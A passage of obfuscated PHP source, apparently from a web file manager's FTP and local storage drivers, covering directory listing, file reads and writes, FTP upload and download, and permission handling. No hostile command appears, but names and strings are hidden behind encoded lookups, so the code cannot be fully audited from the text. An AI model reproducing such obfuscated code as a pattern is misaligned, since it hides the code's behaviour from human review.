$ø®©şÈ[$ÕœÆÎÖÂ[80]] : 0, $ÕœÆÎÖÂ[167] => $this->ext($ˆ¡Ò…Şá)); if ($ä°ìé) { return $ğô±‘«ô; } $ğô±‘«ô[$ÕœÆÎÖÂ[193]] = $ğô±‘«ô[$ÕœÆÎÖÂ[86]] = 0; $ğô±‘«ô[$ÕœÆÎÖÂ[194]] = $ğô±‘«ô[$ÕœÆÎÖÂ[195]] = !0; $‰–Â°£± = $this->iconvSystem($ˆ¡Ò…Şá); $ğô±‘«ô[$ÕœÆÎÖÂ[86]] = @ftp_mdtm($this->connect, $‰–Â°£±); if (empty($ø®©şÈ)) { $ø®©şÈ = $this->objectMeta($ˆ¡Ò…Şá); if (!$ø®©şÈ) { return $ğô±‘«ô; } } $ğô±‘«ô[$ÕœÆÎÖÂ[80]] = $ø®©şÈ[$ÕœÆÎÖÂ[80]]; return $ğô±‘«ô; } public function size($­ÛÇ€Ä¡) { $óµ¶öÕª = $this->objectMeta($­ÛÇ€Ä¡); return $óµ¶öÕª ? $óµ¶öÕª[$_SERVER[¥Ÿ©ÒèÌ][80]] : 0; } public function info($–Ñ‘ŠÏ) { if ($this->isFile($–Ñ‘ŠÏ)) { return $this->fileInfo($–Ñ‘ŠÏ, 0); } else { if ($this->isFolder($–Ñ‘ŠÏ)) { return $this->folderInfo($–Ñ‘ŠÏ); } } return !1; } private function fileList($‚ƒ¬æ„, &$íæÍÔß, &$İ§Ûµåù, $‡ğÀ°Æ = false) { $±Èşş× =& $_SERVER[¥Ÿ©ÒèÌ]; $‚ƒ¬æ„ = $this->iconvSystem($‚ƒ¬æ„); if (!$this->isFolder($‚ƒ¬æ„)) { return !1; } @ftp_chdir($this->connect, $±Èşş×[8]); $‚ƒ¬æ„ = rtrim($‚ƒ¬æ„, $±Èşş×[8]) . $±Èşş×[8]; check_abort(); $¡•’ß³ = $this->listItemCache === !1 ? !1 : !0; $û¥¾¸Îˆ = @ftp_rawlist($this->connect, $‚ƒ¬æ„); if (!$û¥¾¸Îˆ) { $û¥¾¸Îˆ = array(); } $‰ÉÅÚ¯ = array($±Èşş×[10] => 1, $±Èşş×[1358] => 1); foreach ($û¥¾¸Îˆ as $±´æ„‚Â) { $Ç’éø›è = $this->_listItem($±´æ„‚Â); if ($Ç’éø›è[0] == $±Èşş×[749]) { continue; } $¹¬õ¨ºØ = $Ç’éø›è[8]; if (empty($¹¬õ¨ºØ) && $¹¬õ¨ºØ !== $±Èşş×[190] || isset($‰ÉÅÚ¯[$¹¬õ¨ºØ])) { continue; } $¹¬õ¨ºØ = $this->iconvApp($‚ƒ¬æ„ . ltrim($¹¬õ¨ºØ, $±Èşş×[8])); $ëÎê±±Î = array($±Èşş×[32] => $¹¬õ¨ºØ, $±Èşş×[33] => $±Èşş×[192], $±Èşş×[80] => $Ç’éø›è[4]); if (substr($±´æ„‚Â, 0, 1) == $±Èşş×[1359]) { $ëÎê±±Î[$±Èşş×[33]] = $±Èşş×[79]; $ëÎê±±Î[$±Èşş×[80]] = 0; } $øµ»í¾¹ = $ëÎê±±Î[$±Èşş×[33]] == $±Èşş×[79] ? !0 : !1; if ($¡•’ß³) { $this->cacheMethod($±Èşş×[198], $¹¬õ¨ºØ, $øµ»í¾¹); $this->cacheMethod($±Èşş×[199], $¹¬õ¨ºØ, $ëÎê±±Î); } if ($øµ»í¾¹) { $íæÍÔß[] = $¹¬õ¨ºØ; if ($‡ğÀ°Æ) { $this->fileList($¹¬õ¨ºØ, $íæÍÔß, $İ§Ûµåù, $‡ğÀ°Æ); } continue; } $İ§Ûµåù[] = $ëÎê±±Î; } if ($¡•’ß³) { $this->cacheMethod($±Èşş×[198], $‚ƒ¬æ„, !0); } } private function _listItem($Ôã¨ú±‰) { if (empty($Ôã¨ú±‰)) { return array(); } $ìş¦Ÿ¸Ô = preg_split($_SERVER[¥Ÿ©ÒèÌ][1360], $Ôã¨ú±‰); if (count($ìş¦Ÿ¸Ô) <= 9) { return $ìş¦Ÿ¸Ô; } $ìş¦Ÿ¸Ô[8] = trim(substr($Ôã¨ú±‰, strpos($Ôã¨ú±‰, $ìş¦Ÿ¸Ô[7]) + strlen($ìş¦Ÿ¸Ô[7]))); return array_splice($ìş¦Ÿ¸Ô, 0, 9); } public function listPath($±¥ËòùŞ, $—ÌÔÅ»Û = false) { $äØ±¦Æü =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->_isconn()) { return !1; } $¶“ªØµŸ = $æÀ‹ú«Ó = array(); $this->fileList($±¥ËòùŞ, $¶“ªØµŸ, $æÀ‹ú«Ó); foreach ($¶“ªØµŸ as $ß¥àáñ¯ => $û“ÊÙèç) { $¶“ªØµŸ[$ß¥àáñ¯] = $this->folderInfo($û“ÊÙèç, $—ÌÔÅ»Û); } foreach ($æÀ‹ú«Ó as $ß¥àáñ¯ => $û“ÊÙèç) { $æÀ‹ú«Ó[$ß¥àáñ¯] = $this->fileInfo($û“ÊÙèç[$äØ±¦Æü[32]], $—ÌÔÅ»Û, $û“ÊÙèç); } return array($äØ±¦Æü[77] => $¶“ªØµŸ, $äØ±¦Æü[76] => $æÀ‹ú«Ó); } public function has($æïÔñŸ­, $ÚÖÛ†ØÓ = false, $«¨óß‰¸ = true) { $ŠÒÀË¶ =& $_SERVER[¥Ÿ©ÒèÌ]; $Äß†ëÓÊ = $€³õì™Ê = array(); $·“ÆÒõö = $ÚÖÛ†ØÓ ? !0 : !1; $this->fileList($æïÔñŸ­, $Äß†ëÓÊ, $€³õì™Ê, $·“ÆÒõö); if ($ÚÖÛ†ØÓ) { return array($ŠÒÀË¶[202] => count($€³õì™Ê), $ŠÒÀË¶[203] => count($Äß†ëÓÊ)); } if ($«¨óß‰¸) { if (count($€³õì™Ê)) { return !0; } } else { if (count($Äß†ëÓÊ)) { return !0; } } return !1; } public function listAll($­–¿æ“Ù) { $˜ı÷ÛŸé =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->_isconn()) { return !1; } $÷³–™™ = $–Ø½¯‰³ = array(); $this->fileList($­–¿æ“Ù, $÷³–™™, $–Ø½¯‰³, !0); $Ò€šº˜¨ = array(); foreach ($–Ø½¯‰³ as $¶ùõî÷’) { $Ò€šº˜¨[$¶ùõî÷’[$˜ı÷ÛŸé[32]]] = $¶ùõî÷’[$˜ı÷ÛŸé[80]]; } foreach ($÷³–™™ as $¶ùõî÷’) { if (is_string($¶ùõî÷’)) { $Ò€šº˜¨[$¶ùõî÷’] = 0; } } return $this->listAllFiles($­–¿æ“Ù, array_keys($Ò€šº˜¨), $Ò€šº˜¨); } public function getContent($á¢¹Ô©á) { if (!$this->_isconn()) { return !1; } $á¢¹Ô©á = $this->iconvSystem($á¢¹Ô©á); return $this->fileSubstr($á¢¹Ô©á); } public function setContent($†şË‘ÉÁ, $‰Ã«ƒËŸ = '') { if (!$this->_isconn()) { return !1; } $—òì¡İ“ = $this->pathThis($this->iconvSystem($†şË‘ÉÁ)); $¼‡ÈèÑÍ = $this->tempFile($—òì¡İ“); file_put_contents($¼‡ÈèÑÍ, $‰Ã«ƒËŸ); $¶†ŞÌ = $this->upload($†şË‘ÉÁ, $this->iconvApp($¼‡ÈèÑÍ)); $this->tempFileRemve($¼‡ÈèÑÍ); return $¶†ŞÌ; } public function fileSubstr($è¥àÎ‹, $éëİ’ÔÊ = 0, $ˆ¦·Ö½± = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($è¥àÎ‹, $éëİ’ÔÊ, $ˆ¦·Ö½±); } private function ftpRequest($½ÜÛàÃ“, $‹ß…’„ = 0, $·¦õşø = false) { $½ÜÛàÃ“ = $this->iconvSystem($½ÜÛàÃ“); $¶ßÛ…Š¬ = $this->scheme . $this->host . $_SERVER[¥Ÿ©ÒèÌ][4] . $this->port; $²¤Â÷Ì = curl_init(); curl_setopt($²¤Â÷Ì, CURLOPT_URL, $¶ßÛ…Š¬ . $this->pathEncode($½ÜÛàÃ“)); curl_setopt($²¤Â÷Ì, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($·¦õşø) { $Û²Õ›Ä˜ = $‹ß…’„ + $·¦õşø - 1; curl_setopt($²¤Â÷Ì, CURLOPT_RANGE, "{$‹ß…’„}\55{$Û²Õ›Ä˜}"); } curl_setopt($²¤Â÷Ì, CURLOPT_RETURNTRANSFER, 1); $©ë¼…èô = curl_exec($²¤Â÷Ì); curl_close($²¤Â÷Ì); return $©ë¼…èô; } public function upload($ş‰µüĞ­, $ÚÚïš–æ, $ ‘èÌğ¦ = false, $òÒÎ°Ù = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ş‰µüĞ­))) { return !1; } $ş‰µüĞ­ = $this->iconvSystem($ş‰µüĞ­); $ÚÚïš–æ = $this->iconvSystem($ÚÚïš–æ); $â‚øº‚ = ftp_nb_put($this->connect, $ş‰µüĞ­, $ÚÚïš–æ, FTP_BINARY); while ($â‚øº‚ == FTP_MOREDATA) { $â‚øº‚ = ftp_nb_continue($this->connect); } if ($â‚øº‚ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ş‰µüĞ­); } public function download($Ùèš°°¡, $ü¬®¶å = '') { if (!$this->_isconn()) { return !1; } $¬‰ëôº® = $this->pathFather($ü¬®¶å); if (!IO::mkdir($¬‰ëôº®)) { return !1; } $Ùèš°°¡ = $this->iconvSystem($Ùèš°°¡); $ü¬®¶å = $this->iconvSystem($ü¬®¶å); $³Í—¶ˆ = ftp_nb_get($this->connect, $ü¬®¶å, $Ùèš°°¡, FTP_BINARY); while ($³Í—¶ˆ == FTP_MOREDATA) { $³Í—¶ˆ = ftp_nb_continue($this->connect); } if ($³Í—¶ˆ != FTP_FINISHED) { return !1; } return $this->iconvApp($ü¬®¶å); } public function exist($¢„ÙÃ©™) { return $this->isFile($¢„ÙÃ©™) || $this->isFolder($¢„ÙÃ©™); } public function isFile($¶ìóÁ¥÷) { return !$this->isFolder($¶ìóÁ¥÷) && $this->objectMeta($¶ìóÁ¥÷); } public function isFolder($µÖ£™›‰) { return $this->cacheMethod($_SERVER[¥Ÿ©ÒèÌ][198], $µÖ£™›‰); } protected function objectMeta($ô›ü´å) { return $this->cacheMethod($_SERVER[¥Ÿ©ÒèÌ][199], $ô›ü´å); } protected function _objectMeta($ãÊ¼¥¼Æ) { $§ã—„ñÇ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ãÊ¼¥¼Æ == $§ã—„ñÇ[12] || $ãÊ¼¥¼Æ == $§ã—„ñÇ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ãÊ¼¥¼Æ = $this->iconvSystem($ãÊ¼¥¼Æ); $‘ÒŸ¯» = array($§ã—„ñÇ[32] => $this->iconvApp($ãÊ¼¥¼Æ), $§ã—„ñÇ[33] => $§ã—„ñÇ[192], $§ã—„ñÇ[80] => 0); @ftp_chdir($this->connect, $§ã—„ñÇ[8]); $¿¸’é¤ = @ftp_size($this->connect, $ãÊ¼¥¼Æ); if ($¿¸’é¤ != -1) { $‘ÒŸ¯»[$§ã—„ñÇ[80]] = $¿¸’é¤; } else { $Å½©½ÙÀ = @ftp_chdir($this->connect, $ãÊ¼¥¼Æ); if (!$Å½©½ÙÀ) { return !1; } $‘ÒŸ¯»[$§ã—„ñÇ[33]] = $§ã—„ñÇ[79]; } return $‘ÒŸ¯»; } protected function _isFolder($Æ•ªœ‚†) { $ïïñÕÌ› =& $_SERVER[¥Ÿ©ÒèÌ]; if ($Æ•ªœ‚† == $ïïñÕÌ›[12] || $Æ•ªœ‚† == $ïïñÕÌ›[8]) { return !0; } $èä·Ü›à = $this->_objectMeta($Æ•ªœ‚†); return isset($èä·Ü›à[$ïïñÕÌ›[33]]) && $èä·Ü›à[$ïïñÕÌ›[33]] == $ïïñÕÌ›[79] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¬óÏŠØ§) { if (substr($¬óÏŠØ§, 0, 2) == $_SERVER[¥Ÿ©ÒèÌ][1351]) { $¬óÏŠØ§ = BASIC_PATH . substr($¬óÏŠØ§, 2); } return $¬óÏŠØ§; } public function iconvApp($ù¢ÉË©Ç) { $÷·ğ±ï® =& $_SERVER[¥Ÿ©ÒèÌ]; global $config; return $this->iconvTo($ù¢ÉË©Ç, $config[$÷·ğ±ï®[1349]], $config[$÷·ğ±ï®[1348]]); } public function iconvSystem($ÏÕœÈ©) { $ ëêØ¥‡ =& $_SERVER[¥Ÿ©ÒèÌ]; global $config; return $this->iconvTo($ÏÕœÈ©, $config[$ ëêØ¥‡[1348]], $config[$ ëêØ¥‡[1349]]); } public function getPathOuter($š–ÌÍŒ) { $•ÍÌİ¶¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $’´øñò = $this->iconvApp($this->pathBase); $š–ÌÍŒ = $this->iconvApp($š–ÌÍŒ); if (substr($’´øñò, 0, 2) == $•ÍÌİ¶¬[1351]) { $’´øñò = BASIC_PATH . substr($’´øñò, 2); } if (substr($š–ÌÍŒ, 0, 2) == $•ÍÌİ¶¬[1351]) { $š–ÌÍŒ = BASIC_PATH . substr($š–ÌÍŒ, 2); } $’´øñò = KodIO::clear($’´øñò); $š–ÌÍŒ = KodIO::clear($š–ÌÍŒ); $š–ÌÍŒ = substr($š–ÌÍŒ, strlen($’´øñò)); if (empty($this->pathDriver)) { return $š–ÌÍŒ; } return $this->pathDriver . $•ÍÌİ¶¬[8] . ltrim($š–ÌÍŒ, $•ÍÌİ¶¬[8]); } public function mkfile($Ÿà»óì, $ï²Ê’ÎŸ = '', $âĞÚ™²÷ = REPEAT_RENAME) { $Ÿà»óì = $this->iconvSystem($Ÿà»óì); @touch($Ÿà»óì); if ($ï²Ê’ÎŸ) { file_put_contents($Ÿà»óì, $ï²Ê’ÎŸ); } @chmod($Ÿà»óì, $this->pathAuth); return is_file($Ÿà»óì) ? $this->getPathOuter($Ÿà»óì) : !1; } public function mkdir($¸¢÷¸®, $›½áäíÈ = REPEAT_SKIP) { $¸¢÷¸® = $this->iconvSystem($¸¢÷¸®); if (is_dir($¸¢÷¸®)) { return $this->getPathOuter($¸¢÷¸®); } @mkdir($¸¢÷¸®, $this->pathAuth, !0); @chmod($¸¢÷¸®, $this->pathAuth); return is_dir($¸¢÷¸®) ? $this->getPathOuter($¸¢÷¸®) : !1; } public function copyFile($¹Ğ³ïí§, $ß×¿€¿•) { $this->mkdir($this->pathFather($ß×¿€¿•)); $¹Ğ³ïí§ = $this->iconvSystem($¹Ğ³ïí§); $ß×¿€¿• = $this->iconvSystem($ß×¿€¿•); $¢Ò•×š¯ = copy_64($¹Ğ³ïí§, $ß×¿€¿•); @chmod($ß×¿€¿•, $this->pathAuth); return $¢Ò•×š¯ ? $this->getPathOuter($ß×¿€¿•) : !1; } public function moveFile($ÓÛ½ÓÇï, $öÃì¿òš) { $this->mkdir($this->pathFather($öÃì¿òš)); $ÓÛ½ÓÇï = $this->iconvSystem($ÓÛ½ÓÇï); $öÃì¿òš = $this->iconvSystem($öÃì¿òš); $½¦¹ö½ = intval(@rename($ÓÛ½ÓÇï, $öÃì¿òš)); if (!$½¦¹ö½) { if ($½¦¹ö½ = intval(@copy_64($ÓÛ½ÓÇï, $öÃì¿òš))) { @unlink($ÓÛ½ÓÇï); } } @chmod($öÃì¿òš, $this->pathAuth); return $½¦¹ö½ ? $this->getPathOuter($öÃì¿òš) : !1; } public function movePath($÷ÙîÆş•, $Š¤€Š—œ, $Æ·Í …Ÿ = false) { $÷Ü¤™§¥ =& $_SERVER[¥Ÿ©ÒèÌ]; $÷ÙîÆş• = $this->iconvSystem($÷ÙîÆş•); $Š¤€Š—œ = $this->iconvSystem($Š¤€Š—œ); $èŞ‡¬¼¥ = rtrim($Š¤€Š—œ, $÷Ü¤™§¥[8]) . $÷Ü¤™§¥[8] . ($Æ·Í …Ÿ ? $Æ·Í …Ÿ : get_path_this($÷ÙîÆş•)); if (file_exists($èŞ‡¬¼¥)) { return !1; } $ìà‡ÔÑ¦ = intval(@rename($÷ÙîÆş•, $èŞ‡¬¼¥)); $ìà‡ÔÑ¦ = file_exists($èŞ‡¬¼¥); return $ìà‡ÔÑ¦ ? $this->getPathOuter($èŞ‡¬¼¥) : !1; } public function delFile($„ø‡üÔ) { $„ø‡üÔ = $this->iconvSystem($„ø‡üÔ); if (!@unlink($„ø‡üÔ)) { @chmod($„ø‡üÔ, $this->pathAuth); if (!@unlink($„ø‡üÔ)) { return !1; } } else { return !0; } } public function delFolder($™†àİˆ) { $Õªå¯ÓÜ =& $_SERVER[¥Ÿ©ÒèÌ]; $™†àİˆ = $this->iconvSystem($™†àİˆ); if (!is_dir($™†àİˆ)) { return !0; } if (!($û™×ù• = opendir($™†àİˆ))) { return !1; } while (($€Âˆ£ = readdir($û™×ù•)) !== !1) { if ($€Âˆ£ == $Õªå¯ÓÜ[10] || $€Âˆ£ == $Õªå¯ÓÜ[1358]) { continue; } $¹ê°ùì© = $™†àİˆ . $Õªå¯ÓÜ[8] . $€Âˆ£; if (is_file($¹ê°ùì©) || is_link($¹ê°ùì©)) { if (!unlink($¹ê°ùì©)) { chmod($¹ê°ùì©, $this->pathAuth); if (!unlink($¹ê°ùì©)) { return !1; } } } else { if (is_dir($¹ê°ùì©)) { chmod($¹ê°ùì©, $this->pathAuth); $¹ê°ùì© = $this->iconvApp($¹ê°ùì©); if (!$this->delFolder($¹ê°ùì©)) { return !1; } } } } closedir($û™×ù•); return rmdir($™†àİˆ); } public function rename($èßËÔ–ş, $ûÉÑÍšÀ) { $ÉÜËÛØ¿ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ëµ•ıÍ¿ = $this->fileNameAuto($this->pathFather($èßËÔ–ş), $ûÉÑÍšÀ); $Ëµ•ıÍ¿ = $this->iconvSystem($Ëµ•ıÍ¿); $èßËÔ–ş = $this->iconvSystem($èßËÔ–ş); $ûãÂ¯ÈÏ = $this->pathFather($èßËÔ–ş); $»Ş¶ëŒ = rtrim($ûãÂ¯ÈÏ, $ÉÜËÛØ¿[8]) . $ÉÜËÛØ¿[8] . $Ëµ•ıÍ¿; $«½éÊØ = @rename($èßËÔ–ş, $»Ş¶ëŒ); $»Ş¶ëŒ = $this->iconvApp($»Ş¶ëŒ); return $«½éÊØ ? $this->getPathOuter($»Ş¶ëŒ) : !1; } public function size($Ğıç‰¤·) { $Ğıç‰¤· = $this->iconvSystem($Ğıç‰¤·); return filesize_64($Ğıç‰¤·); } public function info($ÔÀÀò‹é) { $ÔÀÀò‹é = $this->iconvSystem($ÔÀÀò‹é); if ($this->isFolder($ÔÀÀò‹é)) { return $this->folderInfo($ÔÀÀò‹é); } else { if ($this->isFile($ÔÀÀò‹é)) { return $this->fileInfo($ÔÀÀò‹é); } } return !1; } protected function infoChildren($±‰¤´ˆ, &$ÍÌÓ¤ÉÑ, $´½Ñ»¯Û = true) { $×Èùü×Ø =& $_SERVER[¥Ÿ©ÒèÌ]; check_abort_echo(); $±‰¤´ˆ = rtrim($±‰¤´ˆ, $×Èùü×Ø[8]) . $×Èùü×Ø[8]; if ($´½Ñ»¯Û) { $±‰¤´ˆ = $this->iconvSystem($±‰¤´ˆ); } if (!($Ùñ²ÀÏĞ = @opendir($±‰¤´ˆ))) { return; } while (($íË’£ÁÊ = readdir($Ùñ²ÀÏĞ)) !== !1) { if ($íË’£ÁÊ == $×Èùü×Ø[10] || $íË’£ÁÊ == $×Èùü×Ø[1358]) { continue; } $Ïğ£Ñ€ê = $±‰¤´ˆ . $íË’£ÁÊ; if (is_file($Ïğ£Ñ€ê) || is_link($Ïğ£Ñ€ê)) { $ÍÌÓ¤ÉÑ[$×Èùü×Ø[81]]++; $ÍÌÓ¤ÉÑ[$×Èùü×Ø[80]] += filesize_64($Ïğ£Ñ€ê); } else { if (is_dir($Ïğ£Ñ€ê)) { $ÍÌÓ¤ÉÑ[$×Èùü×Ø[82]]++; $this->infoChildren($Ïğ£Ñ€ê, $ÍÌÓ¤ÉÑ, !1); } } } closedir($Ùñ²ÀÏĞ); } private function folderInfo($Ç‘ËÖ·, $¹²£÷ó = false) { $ìİ¿ğÈø =& $_SERVER[¥Ÿ©ÒèÌ]; $Ç‘ËÖ· = rtrim($Ç‘ËÖ·, $ìİ¿ğÈø[8]) . $ìİ¿ğÈø[8]; $¢Á•Ã˜œ = $this->iconvApp($this->pathThis($Ç‘ËÖ·)); if ($¹²£÷ó) { return array($ìİ¿ğÈø[32] => $¢Á•Ã˜œ, $ìİ¿ğÈø[78] => $this->getPathOuter($Ç‘ËÖ·), $ìİ¿ğÈø[33] => $ìİ¿ğÈø[79]); } $ãÅàîÜÀ = array($ìİ¿ğÈø[32] => $¢Á•Ã˜œ, $ìİ¿ğÈø[78] => $this->getPathOuter($Ç‘ËÖ·), $ìİ¿ğÈø[33] => $ìİ¿ğÈø[79], $ìİ¿ğÈø[193] => @filectime($Ç‘ËÖ·), $ìİ¿ğÈø[86] => @filemtime($Ç‘ËÖ·), $ìİ¿ğÈø[1361] => @fileatime($Ç‘ËÖ·), $ìİ¿ğÈø[1362] => is_readable($Ç‘ËÖ·), $ìİ¿ğÈø[1363] => is_writable($Ç‘ËÖ·), $ìİ¿ğÈø[1364] => get_mode($Ç‘ËÖ·)); return $ãÅàîÜÀ; } private function fileInfo($ëô›ğ£, $íşÌÚ• = false) { $·å¾ëâï =& $_SERVER[¥Ÿ©ÒèÌ]; $çÚ¿Ü²Ù = $this->iconvApp($this->pathThis($ëô›ğ£)); if ($íşÌÚ•) { return array($·å¾ëâï[32] => $çÚ¿Ü²Ù, $·å¾ëâï[78] => $this->getPathOuter($ëô›ğ£), $·å¾ëâï[33] => $·å¾ëâï[192], $·å¾ëâï[80] => $this->size($ëô›ğ£), $·å¾ëâï[167] => $this->ext($çÚ¿Ü²Ù)); } $ò±´Ø±ô = array($·å¾ëâï[32] => $çÚ¿Ü²Ù, $·å¾ëâï[78] => $this->getPathOuter($ëô›ğ£), $·å¾ëâï[33] => $·å¾ëâï[192], $·å¾ëâï[193] => @filectime($ëô›ğ£), $·å¾ëâï[86] => @filemtime($ëô›ğ£), $·å¾ëâï[1361] => @fileatime($ëô›ğ£), $·å¾ëâï[80] => $this->size($ëô›ğ£), $·å¾ëâï[167] => $this->ext($çÚ¿Ü²Ù), $·å¾ëâï[1362] => is_readable($ëô›ğ£), $·å¾ëâï[1363] => is_writable($ëô›ğ£), $·å¾ëâï[1364] => get_mode($ëô›ğ£)); return $ò±´Ø±ô; } public function exist($ûığ•) { $ûığ• = $this->iconvSystem($ûığ•); return @file_exists($ûığ•); } public function isFile($Ïş Õ’ˆ) { $Ïş Õ’ˆ = $this->iconvSystem($Ïş Õ’ˆ); return @is_file($Ïş Õ’ˆ); } public function isFolder($ß•´¾‹­) { $ß•´¾‹­ = $this->iconvSystem($ß•´¾‹­); return @is_dir($ß•´¾‹­); } public function listPath($­Ø¤Ãİü, $º°øë…¼ = false) { $ºŞ¯¤ğÚ =& $_SERVER[¥Ÿ©ÒèÌ]; $­Ø¤Ãİü = $this->iconvSystem($­Ø¤Ãİü); $­Ø¤Ãİü = rtrim($­Ø¤Ãİü, $ºŞ¯¤ğÚ[8]) . $ºŞ¯¤ğÚ[8]; $‹Õ­ùãò = array($ºŞ¯¤ğÚ[77] => array(), $ºŞ¯¤ğÚ[76] => array()); if (!($ø¦­ïûœ = @opendir($­Ø¤Ãİü))) { return $‹Õ­ùãò; } while (($¸ú¨Š£Š = readdir($ø¦­ïûœ)) !== !1) { if ($¸ú¨Š£Š == $ºŞ¯¤ğÚ[10] || $¸ú¨Š£Š == $ºŞ¯¤ğÚ[1358]) { continue; } $ß´ı¸˜Æ = $­Ø¤Ãİü . $¸ú¨Š£Š; if (is_file($ß´ı¸˜Æ)) { $‹Õ­ùãò[$ºŞ¯¤ğÚ[76]][] = $this->fileInfo($ß´ı¸˜Æ, $º°øë…¼); } else { $‹Õ­ùãò[$ºŞ¯¤ğÚ[77]][] = $this->folderInfo($ß´ı¸˜Æ, $º°øë…¼); } } closedir($ø¦­ïûœ); return $‹Õ­ùãò; } public function listAll($‚©•õŠ, &$¼€û€¼‡ = array()) { $à¯°Â»á =& $_SERVER[¥Ÿ©ÒèÌ]; $‚©•õŠ = $this->iconvSystem($‚©•õŠ); $‚©•õŠ = rtrim($‚©•õŠ, $à¯°Â»á[8]) . $à¯°Â»á[8]; if (!($–ƒªñ©… = @opendir($‚©•õŠ))) { return $¼€û€¼‡; } while (($ğşÇ©şİ = readdir($–ƒªñ©…)) !== !1) { if ($ğşÇ©şİ == $à¯°Â»á[10] || $ğşÇ©şİ == $à¯°Â»á[1358]) { continue; } $ŞÑ¯–ğ° = $‚©•õŠ . $ğşÇ©şİ; if (is_dir($ŞÑ¯–ğ°) && !is_link($ŞÑ¯–ğ°)) { $¼€û€¼‡[] = array($à¯°Â»á[78] => $ŞÑ¯–ğ° . $à¯°Â»á[8], $à¯°Â»á[79] => 1, $à¯°Â»á[86] => @filemtime($ŞÑ¯–ğ°), $à¯°Â»á[80] => 0); $this->listAll($ŞÑ¯–ğ°, $¼€û€¼‡); } else { $¼€û€¼‡[] = array($à¯°Â»á[78] => $ŞÑ¯–ğ°, $à¯°Â»á[79] => 0, $à¯°Â»á[86] => @filemtime($ŞÑ¯–ğ°), $à¯°Â»á[80] => $this->size($ŞÑ¯–ğ°)); } } closedir($–ƒªñ©…); return $¼€û€¼‡; } public function has($¥µ×¾ªö, $ÙáñÇºˆ = false, $¤†õîöñ = true) { $È‰¹Ğ½ô =& $_SERVER[¥Ÿ©ÒèÌ]; $¥µ×¾ªö = $this->iconvSystem($¥µ×¾ªö); $¥µ×¾ªö = rtrim($¥µ×¾ªö, $È‰¹Ğ½ô[8]) . $È‰¹Ğ½ô[8]; if (!($Œœ† úØ = @opendir($¥µ×¾ªö))) { return !1; } $Üã²¯Ç¸ = 0; $âçŞ£Ò = 0; $½ƒ‰«û¥ = 0; while (($ù…±İÔ¥ = readdir($Œœ† úØ)) !== !1) { if ($ù…±İÔ¥ == $È‰¹Ğ½ô[10] || $ù…±İÔ¥ == $È‰¹Ğ½ô[1358]) { continue; } $¬»»‚Ñ = $¥µ×¾ªö . $ù…±İÔ¥; if ($ÙáñÇºˆ) { $½ƒ‰«û¥++; if (@is_file($¬»»‚Ñ)) { $Üã²¯Ç¸++; } else { $âçŞ£Ò++; } if ($½ƒ‰«û¥ > 10000) { break; } continue; } if ($¤†õîöñ) { if (@is_file($¬»»‚Ñ)) { return !0; } } else { if (@is_dir($¬»»‚Ñ . $È‰¹Ğ½ô[8])) { return !0; } } } closedir($Œœ† úØ); if ($ÙáñÇºˆ) { return array($È‰¹Ğ½ô[202] => $Üã²¯Ç¸, $È‰¹Ğ½ô[203] => $âçŞ£Ò); } return !1; } public function hashSimple($ëò‰ãç™) { $¨ŒßÑïû =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ëò‰ãç™) { return md5($¨ŒßÑïû[12]); } $ëò‰ãç™ = $this->iconvSystem($ëò‰ãç™); $·ç­Ä›ç = $this->size($ëò‰ãç™); $î˜Òê˜½ = 200; $çÈòå¯™ = 50; if ($·ç­Ä›ç <= $î˜Òê˜½ * $çÈòå¯™) { return $this->hashMd5($ëò‰ãç™) . $·ç­Ä›ç; } $Ïìöê‰Ë = $¨ŒßÑïû[12]; $²§ÇÎÛ÷ = intval($·ç­Ä›ç / $çÈòå¯™); $Òâ–Î€™ = fopen($ëò‰ãç™, $¨ŒßÑïû[1365]); if (!$Òâ–Î€™) { return $Ïìöê‰Ë; } for ($Èğœ“Èµ = 0; $Èğœ“Èµ < $çÈòå¯™; $Èğœ“Èµ++) { fseek_64($Òâ–Î€™, $²§ÇÎÛ÷ * $Èğœ“Èµ); $Ïìöê‰Ë .= fread($Òâ–Î€™, $î˜Òê˜½); } fseek_64($Òâ–Î€™, $·ç­Ä›ç - $î˜Òê˜½); $Ïìöê‰Ë .= fread($Òâ–Î€™, $î˜Òê˜½); fclose($Òâ–Î€™); return md5($Ïìöê‰Ë) . $·ç­Ä›ç; } public function getContent($¡ş¿©Ì¬) { $¡ş¿©Ì¬ = $this->iconvSystem($¡ş¿©Ì¬); return file_get_contents($¡ş¿©Ì¬); } public function setContent($´šàìËï, $ºØî°¼Ë = '') { $´šàìËï = $this->iconvSystem($´šàìËï); $Ä¯Ù¬íÌ = @file_put_contents($´šàìËï, $ºØî°¼Ë, LOCK_EX); clearstatcache(); @chmod($´šàìËï, $this->pathAuth); return $Ä¯Ù¬íÌ === !1 ? !1 : !0; } public function fileSubstr($®š¢Æ¡, $È”ƒŠı½ = 0, $—ğ¡•¦˜ = false) { $Á¿é¥Ä =& $_SERVER[¥Ÿ©ÒèÌ]; $®š¢Æ¡ = $this->iconvSystem($®š¢Æ¡); if ($—ğ¡•¦˜ === !1) { $—ğ¡•¦˜ = $this->size($®š¢Æ¡); } if ($—ğ¡•¦˜ <= 0) { return $Á¿é¥Ä[12]; } $Î™„Ê™ = fopen($®š¢Æ¡, $Á¿é¥Ä[1365]); if (!$Î™„Ê™) { return !1; } fseek_64($Î™„Ê™, $È”ƒŠı½); $é’ú×Æò = fread($Î™„Ê™, $—ğ¡•¦˜); fclose($Î™„Ê™); return $é’ú×Æò; } public function upload($ª˜…Ş°Ç, $´ßÛĞÎê, $ñßù“ØÆ = false, $“»™ˆ¢Ç = REPEAT_REPLACE) { if ($ñßù“ØÆ) { return $this->moveFile($´ßÛĞÎê, $ª˜…Ş°Ç); } return $this->copyFile($´ßÛĞÎê, $ª˜…Ş°Ç); } public function setModifyTime($ı‘½æòÙ, $ì‘¨Œ = '') { @touch($ı‘½æòÙ, 